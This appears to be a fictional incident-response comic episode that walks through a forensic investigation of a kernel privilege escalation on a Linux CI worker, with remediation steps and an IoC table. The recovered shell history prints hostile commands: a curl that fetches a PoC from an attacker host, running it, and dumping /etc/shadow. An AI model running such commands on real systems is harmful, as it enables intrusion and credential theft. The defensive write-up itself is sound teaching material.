---
title: Four Bytes to Root
number: 4
released: 2026-06-04
pages: 15

cover: assets/covers/four-bytes-to-root.jpg
pdf: assets/pdf/DFIR_Chronicles_Four_Bytes_to_Root.pdf

host: ci-worker-07
techniques: [T1068, T1078.003, T1059.006]
tags: [Linux, Kernel, CI/CD, Privilege escalation]

# The SIEM line that opened the case. Feeds the SOC ticker on the home page.
alert: 03:14:07 [ALERT] non-shell parent for su — host=ci-worker-07 uid=0 parent=python3

# One line for the card and the billboard.
hook: >-
  Four bytes written into the page cache hand back root. The binary on
  disk never changes. Only the process tree knows.
---

# Four Bytes to Root

## Back cover

In this episode of The DFIR Chronicles, cyber-investigator Dylan Log, analyst Cyra Neuron, and forensic prodigy Byte are dragged out of bed by four bytes that should never have moved.

It is 03:14 when the night shift forwards the call. The SIEM has just raised a `non-shell parent for su` alert on **ci-worker-07**, a multi-tenant CI/CD build worker that has been grinding through developer pipelines since the 7th of May. The detection rule is brutally simple: correlate any `su` whose parent is not `bash`, `sh`, `login`, `sudo`, or `sshd`. On a host that normally sees nothing louder than cron and build jobs, that single line is a scream. The EDR can still feel the warmth of the attacker's session, closed only hours ago — so the machine is dropped into read-only network quarantine, the filesystem frozen, the Velociraptor artifacts already staged. The PM wants to know how someone reached root and whether the payload touched other hosts. The platform owner wants to know whether to regenerate the AMI or patch a live wound. Before the shift changes, the chain has to be rebuilt.

The trail opens with an authentication that lies about who it is. Developer **dvogel** — who has never logged in with anything but a publickey from the internal subnet — appears in `/var/log/auth.log` authenticating with a *password* from **91.214.63.117**, a routable address whose reverse DNS resolves to **cdn-edge-fra1.duckdns.org**. Twenty-five seconds of recon (`id`, `uname -a`, `/etc/os-release`) and the intruder knows exactly where they have landed: Ubuntu 24.04.2 LTS, kernel **6.17.0-9-generic**. A `curl` to `https://cdn-edge-fra1.duckdns.org:8443/cfail.py` drops a small Python script into `/dev/shm` — tmpfs, volatile, the perfect grave for a stager. Seconds later `python3 /dev/shm/cfail.py` opens an `AF_ALG` socket bound to `authencesn(hmac(sha256),cbc(aes))` and, through **CVE-2026-31431 — "Copy Fail"**, writes four controlled bytes into the *page-cache* copy of `/usr/bin/su`. The binary on disk never changes. `dpkg -V util-linux` stays silent. `sha256sum` swears the file is pristine. And then `su -`, spawned not by a shell but by `/usr/bin/python3`, hands back `uid=0`.

What follows is textbook occupation. As root the attacker forges a backdoor account, **svcmon** (uid 1500), props open `/home/svcmon/.ssh/`, and staples an attacker-controlled ED25519 key to `/root/.ssh/authorized_keys` — a door that bypasses the new account entirely. `/etc/shadow` is dumped for offline cracking, `history -c` is fired in a last gesture of hygiene, and the SSH session closes. But the on-disk `.bash_history` had already swallowed every command while the shell was alive, and the page cache still remembers the four bytes that mattered. This is **T1068** (Exploitation for Privilege Escalation) stacked on **T1078.003** (Valid Accounts) and **T1059.006** (Python), and not a single file-integrity tool will admit it happened.

In a world where the binary on disk is innocent and the binary in memory is guilty, the only confession comes from the process tree — and in The DFIR Chronicles, the team learns that sometimes the entire breach fits in four bytes that were never supposed to move.

## Technical note

The investigation proceeds in layers, as senior IR lead Dylan Log frames it: first *what* the machine is, then *who* came in, then *what privilege* they reached, then *what they ran*, then *what is alive right now*, and finally the integrity of the setuid binaries and the kernel itself. Each layer is collected with a signed Velociraptor artifact wherever one exists, falling back to the shell only when no artifact covers the question. T-zero for this timeline is the attacker's SSH login at **2026-05-21 22:48:00 UTC**.

### 1. Establish system identity and kernel version

**Goal.** Determine the distribution, kernel release, and role of the host so that every candidate TTP can be weighed for plausibility. The kernel *release string* is the value used to search for applicable CVEs.

**Action.**

```text
!run Custom.Linux.Sys.OSInfo
```

`Custom.Linux.Sys.OSInfo` aggregates the four sources that fingerprint a Linux system into one report-ready, artifact-signed table, rather than relying on an unsigned `cat /etc/os-release` + `uname -a` from the shell:

- **OSRelease** — `NAME`, `VERSION`, `VERSION_CODENAME` from `/etc/os-release`
- **LSBRelease** — distributor/release fields from `/etc/lsb-release`
- **Issue** — the login banner (`/etc/issue`)
- **Uname** — `Kernel`, `Hostname`, `Release`, `Version`, `Machine`

**Finding.**

| Field | Value |
|-------|-------|
| Hostname | `ci-worker-07` |
| Distribution | Ubuntu 24.04.2 LTS (Noble Numbat) |
| Kernel Release | `6.17.0-9-generic` |
| Machine | `x86_64` |
| Role | Multi-tenant CI/CD build worker, SSH for unprivileged developer accounts |

The kernel release `6.17.0-9-generic` is the pivot. This build ships the `algif_aead` module with the in-place AEAD optimization (originating in commit `72548b093ee3`, 2017) that is still present pre-patch — the substrate for CVE-2026-31431. Noting the kernel version this early lets the team keep a kernel-level LPE on the table while they work through the more common privilege-escalation paths.

### 2. Reconstruct recent access: who, from where, with which auth method

**Goal.** Build an ordered list of recent logins and surface authentication-method anomalies — the most reliable single signal on a multi-user host.

**Actions.**

```text
!run Custom.Linux.Sys.RSyslogSSHLogin
!run Linux.Sys.LastUserLogin
```

`Custom.Linux.Sys.RSyslogSSHLogin` parses `/var/log/auth.log` and returns `Time`, `IP`, `Result` (Accepted/Failed), `Method` (publickey/password), `AttemptedUser`, `Port`, and a `Signature` per event — the richest view for spotting a method anomaly. `Linux.Sys.LastUserLogin` reads the binary `/var/log/wtmp` and returns `User`, `Hostname`, `Terminal`, `Timestamp`, `Type`: the list of *actual* sessions. The two are complementary — `wtmp` is binary and survives text-syslog tampering, so agreement between them raises confidence.

**Finding.** Within the relevant window:

| Time (UTC) | User | Source IP | Method | Result |
|------------|------|-----------|--------|--------|
| 2026-05-21 14:18:00 | `marlowe` | 10.42.1.18 | publickey | Accepted |
| 2026-05-21 22:13:00 | `marlowe` | 10.42.1.18 | publickey | session ends (last legitimate activity) |
| 2026-05-21 22:48:00 | `dvogel` | 91.214.63.117 | **password** | Accepted |
| 2026-05-21 23:03:00 | `dvogel` | 91.214.63.117 | — | session closed |

The admin `marlowe` behaves normally: publickey from the internal workstation `10.42.1.18`. The developer `dvogel`, however, authenticates with a **password** from the *public* address `91.214.63.117` — this account's baseline is publickey from the internal subnet. The auth-method switch (publickey → password) combined with an external source IP is the first concrete anomaly and marks T-zero of the intrusion.

### 3. Hunt for privilege events in the same window

**Goal.** Determine what happened *after* the suspicious login — `sudo`, `su`, `useradd`, `passwd` — to understand how the account reached its target privilege.

**Action.**

```text
!run Custom.Linux.Sys.AuthLog
```

`Custom.Linux.Sys.AuthLog` exposes four column-structured, time-normalized sources, which beats an ad-hoc `grep` of `/var/log/auth.log`:

- **Sudo** — `Timestamp`, `Host`, `Program`, `User`, `RunAs`, `PWD`, `Command`, `Result`
- **SuEvents** — `Timestamp`, `Host`, `Program`, `User`, `InvokedBy`, `Event`
- **UserMgmt** — `useradd` / `usermod` / `passwd` activity
- **PAMFailures** — PAM rejections

**Finding.** Two rows tell the story:

- **SuEvents** — `2026-05-21 22:51:42 UTC`: `su -` invoked by `dvogel`, `Event = session opened for user root`. The session succeeds, yet there is no preceding `sudo` and no membership that should grant it.
- **UserMgmt** — `2026-05-21 22:52:20 UTC`: `useradd -m -s /bin/bash svcmon` executed by `root`, immediately followed by a `passwd` for the same user.

A successful `su -` to root by an unprivileged developer, with no legitimate path to it, is the privilege event. The `useradd` 38 seconds later confirms the actor was operating as root by then.

### 4. Read the interactive command history

**Goal.** See what the attacker actually *did*, not merely what the system logged.

**Action.**

```text
!run Custom.Linux.Sys.ShellHistory
```

The artifact aggregates the Bash source (`OSPath`, `LineNum`, `Command`, `Timestamp`) with Zsh and Fish, reading every user's history file. Timestamps derive from the file (per-line `mtime` where `HISTTIMEFORMAT` is set). Crucially, even if a user runs `history -c`, that command is recorded as the last persisted line — the in-memory wipe cannot retract what was already flushed to disk while the shell lived.

**Finding.** `/home/dvogel/.bash_history` reads, in order:

```bash
id
whoami
uname -a
cat /etc/os-release
curl https://cdn-edge-fra1.duckdns.org:8443/cfail.py -o /dev/shm/cfail.py
python3 /dev/shm/cfail.py
su -
useradd -m -s /bin/bash svcmon
cat /etc/shadow
history -c
```

This is the full kill chain in plaintext: recon → stage a PoC into tmpfs via `curl` over port 8443 → execute the interpreter against it → `su -` → create a backdoor account → exfiltrate `/etc/shadow` → attempt to wipe history. The presence of `history -c` as the final line is the tell that the wipe failed against the on-disk file. Note that the privileged commands (`useradd`, `cat /etc/shadow`) appear in `dvogel`'s history because `su -`'s child shell inherited the same controlling terminal session.

### 5. Map live processes and find anomalous parent-child relationships

**Goal.** Identify the process-tree relationship that the SIEM rule fired on — the smoking gun.

**Actions.**

```text
!run Generic.System.Pstree
!run Custom.Linux.Sys.ProcEnviron
```

`Generic.System.Pstree` returns `PID`, `PPID`, `Name`, `Level`, `Depth`, `Cmdline`, `Exe`. The explicit `Level`/`Depth` fields make chains legible without decoding the ASCII indentation of `ps -ef --forest`. `Custom.Linux.Sys.ProcEnviron` reads `/proc/<pid>/environ` and returns one row per environment variable (`Pid`, `Ppid`, `Process`, `Username`, `Key`, `Value`); cross-referencing `Pid`/`Ppid` against the pstree lets the analyst trace the parent of a privileged process and read variables (`SUDO_USER`, `LD_PRELOAD`, …) that influenced it.

**Finding.** The pstree exposes the abnormal chain:

```text
sshd (dvogel)
└─ bash
   └─ python3   (pid 18602)  /usr/bin/python3 /dev/shm/cfail.py
      └─ su     (pid 18603)  su -
         └─ bash (root)
```

`/usr/bin/su` (pid **18603**) has `/usr/bin/python3` (pid **18602**) as its parent. A legitimate `su` descends from a shell, `login`, `sudo`, or `sshd` — never from a Python interpreter. This is precisely the `non-shell parent for su` condition the SIEM rule encodes. `Custom.Linux.Sys.ProcEnviron` confirms the parent process is `python3` running `/dev/shm/cfail.py` and shows no `SUDO_USER` and no `LD_PRELOAD` — ruling out a `sudo`-mediated or library-injection path and forcing attention onto the interpreter itself.

### 6. Validate setuid binary integrity and inspect the kernel layer

**Goal.** If the path to root did not pass through the filesystem, it passed through memory or the kernel. Confirm that `/usr/bin/su` is byte-identical on disk, then check what kernel modules are loaded.

**Actions.**

```text
!run Linux.Sys.SUID
sha256sum /usr/bin/su
dpkg -V util-linux
!run Custom.Linux.Proc.ModInfo
```

- `Linux.Sys.SUID` enumerates binaries with the SUID/SGID bit (`-perm -4000`) under canonical paths and returns `OSPath`, `Mode`, `Uid`, `Gid`, `Size`, `Mtime`, `Inode`. The `Mtime` reveals whether a setuid file was touched recently — a strong IoC in escalation cases.
- `sha256sum /usr/bin/su` computes the on-disk hash of the escalation candidate. No Velociraptor artifact hashes a single named file, so the shell is the legitimate tool here.
- `dpkg -V util-linux` verifies (`-V`) the package against the dpkg database, printing one line per file that diverges from what the package installed.
- `Custom.Linux.Proc.ModInfo` lists loaded modules (`Module`, `Filename`, `License`, `Description`, `Depends`, `Vermagic`, `Signer`, …) and reads the kernel taint flag from `/proc/sys/kernel/tainted`.

**Finding — the forensic trap.**

- `Linux.Sys.SUID` shows `/usr/bin/su` with mode `4755`, owner `root`, and an `Mtime` matching the original package install date — *not* recently modified.
- `sha256sum /usr/bin/su` returns `a3f5c9d27e84b1602f4d9a7c5e3b18d460f2a9c7e1b4d8503f6a2c9e7d1b04a8f`, which equals the value shipped by the `util-linux` package.
- `dpkg -V util-linux` prints **nothing** — the dpkg database agrees the file is identical to the package.

Every filesystem-integrity check is clean. This is the trap: the *on-disk* `su` is genuinely untouched. The corruption lives only in the **page cache** — the in-memory copy of the binary that `exec()` actually maps — which traditional integrity tooling never inspects.

The kernel layer breaks the deadlock. `Custom.Linux.Proc.ModInfo` reports the **`algif_aead`** module loaded, alongside `af_alg`. On a build worker that runs no userspace crypto-acceleration workload, a crypto-subsystem module auto-loaded *on demand* by an unprivileged user process is anomalous — and it correlates precisely with `T+00:03:15` (`2026-05-21 22:51:15 UTC`), the moment `cfail.py` created the `AF_ALG` socket. Combined with the kernel release from Step 1 and the lone `/dev/shm` staging file flagged by `Custom.Linux.Forensics.Timeline`, the picture resolves to a kernel-level LPE rather than a classical SUID/sudo misuse.

### 7. Corroborate the staging artifact on the filesystem timeline

**Goal.** Tie the dropped PoC to a concrete mtime and confirm nothing else on disk was altered.

**Action.**

```text
!run Custom.Linux.Forensics.Timeline
```

`Custom.Linux.Forensics.Timeline` builds a MAC-time timeline of the filesystem. Because the exploit modifies no on-disk binary, the timeline highlights exactly one new artifact in the intrusion window: `/dev/shm/cfail.py`.

**Finding.**

- `/dev/shm/cfail.py` — created `2026-05-21 22:50:48 UTC` (`T+00:02:48`), on `tmpfs`, sha256 `7b2e9f0c4a1d83567e2b9c4f1a8d05e36c9b7a2e4f1d8350b6a2c9e7d4f1b08c3`.
- `/root/.ssh/authorized_keys` — modified `2026-05-21 22:53:40 UTC` (`T+00:05:40`): an attacker ED25519 key appended.

The timeline confirms the only persistent file artifacts are the volatile-directory stager and the appended root key — consistent with a memory-resident escalation.

### 8. Expected resolution

**Root cause.** Exploitation of **CVE-2026-31431 ("Copy Fail")** — a logic flaw in the `algif_aead` kernel module (`authencesn` template) that lets an unprivileged local user write four controlled bytes into the page cache of any readable file. Here it patched the in-memory copy of `/usr/bin/su`, yielding a root shell while the on-disk binary stayed byte-identical to its `util-linux` package counterpart.

**Attack vector / chain.**

1. SSH login as `dvogel` from `91.214.63.117` using **password** authentication (anomalous: account baseline is publickey from the internal subnet). — *Initial access, T1078.003.*
2. Local recon (`id`, `whoami`, `uname -a`, `/etc/os-release`) to confirm distro and kernel.
3. Staged a Python kernel-LPE PoC to `/dev/shm/cfail.py` via `curl` from `https://cdn-edge-fra1.duckdns.org:8443`. — *T1059.006.*
4. Ran `python3 /dev/shm/cfail.py`: opened an `AF_ALG` socket bound to `authencesn(hmac(sha256),cbc(aes))` and used `splice()` to corrupt the page-cache copy of `/usr/bin/su`. — *T1068.*
5. Invoked `su -` as a child of `python3`; the corrupted in-memory `su` returned `uid=0`.
6. As root: created backdoor account `svcmon`, set its password, prepared `/home/svcmon/.ssh/`.
7. Appended an attacker ED25519 public key to `/root/.ssh/authorized_keys`.
8. Dumped `/etc/shadow` for offline cracking.
9. Ran `history -c` and disconnected; the persisted `/home/dvogel/.bash_history` was *not* removed.

**Persistence mechanism.** Two stacked mechanisms: **(a)** a backdoor local account `svcmon` (uid 1500, shell `/bin/bash`, known password); **(b)** an attacker SSH public key appended to `/root/.ssh/authorized_keys`, enabling direct root login over SSH and bypassing the new account.

**Affected assets.**

- `ci-worker-07`
- `dvogel` (compromised credentials)
- `/root` — full privilege compromise
- `/etc/shadow` — credential hashes for all local accounts exfiltrated
- `/root/.ssh/authorized_keys`
- `/home/svcmon/.ssh/authorized_keys`

**Recommended remediation.**

- Isolate `ci-worker-07` from the network; **do NOT reboot** — preserve runtime evidence (page cache, `lsmod` state).
- Force-rotate the credentials of `dvogel` and any developer sharing the same vault entry.
- Remove the backdoor account `svcmon` (`userdel -r svcmon`) and audit `/etc/passwd`, `/etc/shadow`, `/etc/group`, `/etc/sudoers`, and `/etc/sudoers.d/` for unexpected entries.
- Sanitize `/root/.ssh/authorized_keys` and `/home/*/.ssh/authorized_keys`; rotate root's own SSH keys if any.
- Treat `/etc/shadow` as compromised: force-reset every interactive account password.
- Patch the kernel to the Ubuntu USN for Noble that reverts the in-place AEAD optimization; validate with `uname -r` after reboot.
- Until patched, disable `algif_aead`/`af_alg` (`rmmod` + blacklist in `/etc/modprobe.d/`) or block `AF_ALG` via a seccomp profile / LSM policy on the build worker.
- Re-image `ci-worker-07` from a known-good template once forensic capture is complete.
- Restrict egress: allow outbound only to artifact registries and package mirrors; block direct internet `curl`.
- Add SIEM detections for non-shell parents of `/usr/bin/su`, `AF_ALG` socket creations by non-root processes, and writes to `/dev/shm` by interactive users.

### 9. Key IoCs for SOC-fleet dissemination

| Type | Indicator | Notes |
|------|-----------|-------|
| IP | `91.214.63.117` | SSH source for the attacker session; host of the PoC staging server |
| Domain | `cdn-edge-fra1.duckdns.org` | Reverse DNS for `91.214.63.117`; staging server FQDN |
| URL | `https://cdn-edge-fra1.duckdns.org:8443/cfail.py` | PoC staging URL |
| Port | `8443/tcp` | Staging server port |
| Path | `/dev/shm/cfail.py` | Tmpfs staging location of the kernel LPE PoC |
| Filename | `cfail.py` | Staged PoC filename |
| SHA-256 | `7b2e9f0c4a1d83567e2b9c4f1a8d05e36c9b7a2e4f1d8350b6a2c9e7d4f1b08c3` | Hash of the PoC Python script |
| Command | `python3 /dev/shm/cfail.py` | Triggers the `algif_aead` page-cache write against `/usr/bin/su` |
| Account | `svcmon` (uid 1500) | Backdoor account created post-escalation |
| Key | Attacker ED25519 key | Present in `/root/.ssh/authorized_keys` and `/home/svcmon/.ssh/authorized_keys` |
| Module | `algif_aead` | Loaded on demand at `2026-05-21 22:51:16 UTC` (`T+00:03:16`) |
| Process anomaly | `su` (pid 18603) ← `python3` (pid 18602) | Non-shell parent for `su` — the principal IoC |
| CVE | CVE-2026-31431 | "Copy Fail" — `algif_aead` 4-byte page-cache write primitive |

A reference value for fleet-wide integrity baselining: the pristine package sha256 of `/usr/bin/su` on this build is `a3f5c9d27e84b1602f4d9a7c5e3b18d460f2a9c7e1b4d8503f6a2c9e7d1b04a8f`. Note that this hash matching does **not** clear a host — the attack leaves the on-disk binary untouched, so detection must rely on the process-tree and kernel-module signals above rather than file hashing alone.
